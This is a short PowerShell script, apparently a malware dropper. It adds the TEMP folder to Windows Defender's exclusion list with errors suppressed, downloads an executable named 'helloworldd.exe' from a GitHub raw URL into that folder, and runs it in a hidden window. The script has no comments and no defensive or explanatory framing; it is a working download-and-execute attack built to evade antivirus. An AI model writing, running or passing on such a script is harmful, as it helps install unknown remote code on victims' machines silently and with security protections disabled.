$path = Get-Item $env:TEMP
$folder = $path.FullName

try {
    Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
} catch {}

Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe" -OutFile "$folder\helloworldd.exe" -ErrorAction SilentlyContinue
Start-Process -FilePath "$folder\helloworldd.exe" -WindowStyle Hidden
